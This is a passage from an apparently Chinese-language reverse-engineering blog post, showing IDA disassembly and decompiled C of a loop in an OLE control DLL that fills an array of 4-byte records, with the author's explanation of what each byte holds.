&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;D8C&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_100081D9+151p ...&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;D8C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;var_10&lt;/span&gt;          &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;var_C&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;Ch&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;var_8&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;var_4&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;arg_0&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt;  &lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8D&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8F&lt;/span&gt;                 &lt;span class="no"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D92&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_10&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D95&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D98&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;sub_10034BF0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D9D&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DA0&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DA7&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020DB2&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DA9&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DA9&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DA9&lt;/span&gt; &lt;span class="no"&gt;loc_10020DA9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020D8C+68j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DA9&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DAC&lt;/span&gt;                 &lt;span class="no"&gt;add&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DAF&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DB2&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DB2&lt;/span&gt; &lt;span class="no"&gt;loc_10020DB2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020D8C+1Bj&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DB2&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c"&gt;; this&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DB5&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="no"&gt;GetClientSite@COleControl@@QAEPAUIOleClientSite@@XZ&lt;/span&gt; &lt;span class="c"&gt;; COleControl::GetClientSite(void)&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DBA&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DBD&lt;/span&gt;                 &lt;span class="no"&gt;jge&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020DF6&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DBF&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="no"&gt;Bh&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DC3&lt;/span&gt;                 &lt;span class="no"&gt;jg&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020DF6&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DC5&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DC8&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DCB&lt;/span&gt;                 &lt;span class="no"&gt;movsx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;byte&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DD0&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DD1&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_10&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DD4&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;sub_10020DFE&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DD9&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_C&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DDC&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DDF&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DE2&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;byte&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DE5&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DE9&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DEC&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DEF&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;byte&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DF4&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020DA9&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DF6&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DF6&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DF6&lt;/span&gt; &lt;span class="no"&gt;loc_10020DF6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020D8C+31j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DF6&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_10020D8C+37j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DF6&lt;/span&gt;                 &lt;span class="no"&gt;xor&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DF8&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFA&lt;/span&gt;                 &lt;span class="no"&gt;pop&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFB&lt;/span&gt;                 &lt;span class="no"&gt;retn&lt;/span&gt;    &lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFB&lt;/span&gt; &lt;span class="no"&gt;sub_10020D8C&lt;/span&gt;    &lt;span class="no"&gt;endp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;F5到C语言后关键部分是这样的：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;COleControl&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetClientSite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_BYTE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sub_10020DFE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_BYTE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_BYTE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看出这类似于一个数组操作，而数组每个元素中至少有4个byte长度的值（可以看成是一个自定义数据类型），分别是：第0个不清楚，第3个是第1个经过运算的结果，第2个恒为0。点进去看表示第3个和第1个元素之间的函数&lt;code&gt;sub_10020DFE&lt;/code&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt; &lt;span class="no"&gt;sub_10020DFE&lt;/span&gt;    &lt;span class="no"&gt;proc&lt;/span&gt; &lt;span class="no"&gt;near&lt;/span&gt;               &lt;span class="c"&gt;; CODE XREF: sub_10020D8C+48p&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;DFE&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt; &lt;span class="no"&gt;var_8&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt; &lt;span class="no"&gt;var_4&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt; &lt;span class="no"&gt;arg_0&lt;/span&gt;           &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt;  &lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt;
